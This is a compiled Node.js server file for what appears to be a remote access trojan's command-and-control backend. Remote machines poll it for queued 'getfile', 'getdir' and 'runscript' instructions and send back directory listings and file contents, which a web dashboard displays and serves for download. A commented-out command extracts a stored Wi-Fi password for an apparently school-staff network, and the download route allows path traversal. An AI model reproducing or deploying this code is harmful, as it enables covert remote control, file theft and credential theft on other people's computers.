"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const body_parser_1 = __importDefault(require("body-parser"));
const express_1 = __importDefault(require("express"));
const fs_1 = __importDefault(require("fs"));
const http_1 = __importDefault(require("http"));
const net_1 = __importDefault(require("net"));
const path_1 = __importDefault(require("path"));
const socketio = require("socket.io");
const server = new net_1.default.Server();
const PORT = 8081;
const app = (0, express_1.default)();
const httpserver = http_1.default.createServer(app);
const io = socketio(httpserver);
const userIDS = new Map();
console.log(Buffer.from(";dfbid;"));
const MessageSplitter = ";sfd;";
const Computers = new Map();
const instructions = new Map();
function wait(ms) {
    return new Promise((res) => {
        setTimeout(() => res(), ms);
    });
}
function isEmptyDir(path) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const directory = yield fs_1.default.promises.opendir(path);
            const entry = yield directory.read();
            yield directory.close();
            return entry === null;
        }
        catch (error) {
            return false;
        }
    });
}
function waitForResponse(id, maxTime) {
    return new Promise((res) => {
        setTimeout(() => {
            res();
        }, maxTime);
        setInterval(() => {
            const data = Computers.get(id);
            if (data) {
                if (data.length > 0)
                    res();
            }
        }, 50);
    });
}
const connections = server.on("connection", (socket) => {
    let currentID;
    let filedata = [];
    let sendingFile = false;
    let filename = "";
    //console.log(socket.remoteAddress, socket.remotePort);
    socket.on("data", (data) => __awaiter(void 0, void 0, void 0, function* () {
        let newBuffer = new Buffer(0);
        const lastIndexOfSplitter = data.lastIndexOf(";sfd;");
        if (String(data).startsWith("ping")) {
            const ID = String(data).split(MessageSplitter)[1];
            if (!instructions.has(ID)) {
                console.log("settingID");
                instructions.set(ID, []);
            }
            if (!ID)
                return socket.write("noInstruction");
            if (!instructions.has(ID))
                return socket.write("noInstruction");
            const instruction = instructions.get(ID);
            if (!instruction || !instruction.length)
                return;
            console.log(instruction);
            socket.write(instruction[0]);
            instruction.shift();
            instructions.set(ID, instruction);
            return;
        }
        if (String(data).startsWith("setid")) {
            const ID = String(data).split(MessageSplitter)[1];
            if (!ID)
                return;
            if (instructions.has(ID))
                return;
            console.log("settingID");
            instructions.set(ID, []);
            return;
        }
        if (String(data).startsWith("dirdata")) {
            console.log(String(data)
                .split(";sfd;")
                .map((item) => item.split(";osd;")));
            Computers.set(String(data).split(";sfd;")[1], String(data)
                .split(";sfd;")
                .map((item) => item.split(";osd;")));
            return;
        }
        if (String(data).startsWith("runscript")) {
            //socket.write(
            //  `runscript;netsh wlan show profiles name="LehrerSLZ" key=clear`
            //);
            console.log(String(data));
            const ID = String(data).split(MessageSplitter)[1];
            if (!ID)
                return;
            Computers.set(ID, [data.toString("utf-8")]);
            return;
        }
        /*if (String(data).startsWith("receiveFile")) {
          //currentID = String(data).split(MessageSplitter)[1];
          //const fileLocation = String(data).split(MessageSplitter)[2];
          //console.log(fileLocation);
          //if (!fs.existsSync(`../${currentID}/${fileLocation}`)) return;
          //socket.write(await fs.promises.readFile(`../${currentID}/${filename}`));
          console.log(String(data));
          console.log(fileToSend.length);
          socket.write(fileToSend);
          socket.end();
          return;
        }*/
        if (String(data).startsWith("filedata")) {
            console.trace(String(data));
            sendingFile = true;
            let res = "";
            let count = 0;
            let fileSpecifier = String(data.slice(0, lastIndexOfSplitter));
            let [commandName, ID, SpecifiedData] = fileSpecifier.split(";sfd;");
            filename = SpecifiedData;
            currentID = ID;
            console.log(commandName, ID, SpecifiedData);
            newBuffer = data.slice(lastIndexOfSplitter + 5, data.length - 1);
            const d = {
                commandName,
                ID,
                SpecifiedData,
            };
        }
        else if (sendingFile) {
            newBuffer = data;
        }
        filedata.push(newBuffer);
    }));
    socket.on("end", () => __awaiter(void 0, void 0, void 0, function* () {
        if (!sendingFile)
            return;
        if (!filename)
            return;
        console.trace(filename);
        filename = filename.split("\\\\").pop();
        console.trace(filename);
        if (!filename)
            return;
        if (!currentID)
            return;
        let dir = path_1.default.join(__dirname, currentID);
        console.trace(dir);
        if (!fs_1.default.existsSync(dir)) {
            yield fs_1.default.promises.mkdir(dir, 0o744);
        }
        fs_1.default.writeFile(path_1.default.join(__dirname, "./" + currentID + "\\\\" + filename), Buffer.concat(filedata), (res) => {
            console.trace(res === null || res === void 0 ? void 0 : res.path);
        });
        Computers.set(currentID, [filename]);
        setTimeout(() => __awaiter(void 0, void 0, void 0, function* () {
            yield fs_1.default.promises.unlink(path_1.default.join(__dirname, "./" + currentID + "\\\\" + filename));
            if (!fs_1.default.existsSync(dir))
                return;
            if (yield isEmptyDir(path_1.default.join(__dirname, currentID)))
                return;
            yield fs_1.default.promises.rmdir(path_1.default.join(__dirname, currentID));
        }), 30000);
        sendingFile = false;
    }));
});
io.on("connection", (socket) => {
    const ids = [];
    for (let key of instructions.keys()) {
        ids.push(key);
    }
    socket.emit("newIDS", ids);
    socket.on("getFile", (data) => __awaiter(void 0, void 0, void 0, function* () {
        instructions.set(data.id, ["getfile;" + data.data]);
        yield waitForResponse(data.id, 60000);
        socket.emit("getFile", Computers.get(data.id));
        Computers.set(data.id, []);
    }));
    socket.on("getDir", (data) => __awaiter(void 0, void 0, void 0, function* () {
        console.log(data);
        instructions.set(data.id, [`getdir;${data.dir}`]);
        yield waitForResponse(data.id, 10000);
        socket.emit("getDir", Computers.get(data.id));
        Computers.set(data.id, []);
    }));
    socket.on("runscript", (data) => __awaiter(void 0, void 0, void 0, function* () {
        //console.trace(data)
        instructions.set(data.id, [`runscript;${data.data}`]);
        yield waitForResponse(data.id, 60000);
        // @ts-ignore
        console.log(Computers.get(data.id)[0]);
        socket.emit("runscript", 
        // @ts-ignore
        Computers.get(data.id) ? Computers.get(data.id)[0] : []);
        Computers.set(data.id, []);
    }));
});
server.listen(8082, () => {
    console.log("Listening on Port: ", 8082);
});
app.use(body_parser_1.default.json());
app.use(body_parser_1.default.urlencoded({ extended: true }));
app.use(express_1.default.static("../public"));
app.get("/", (req, res) => {
    res.sendFile(path_1.default.join(__dirname, "../public/index.html"));
});
app.get("/file/:id/:name", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    console.log(req.params);
    res.download(path_1.default.join(__dirname, `/../${req.params.id}/${req.params.name}`));
}));
process.openStdin();
process.stdin.on("data", (data) => __awaiter(void 0, void 0, void 0, function* () {
    const ID = instructions.keys().next().value;
    if (!ID)
        return;
    const instructionsArray = instructions.get(ID);
    if (!instructionsArray)
        return;
    instructionsArray.push(String(data));
    const textfile = yield fs_1.default.promises
        .readFile("./random.txt")
        .catch((err) => console.error(err));
    instructions.set(ID, [String(textfile)]);
}));
httpserver.listen(PORT, () => {
    console.log(`Listening on port: ${PORT}`);
});
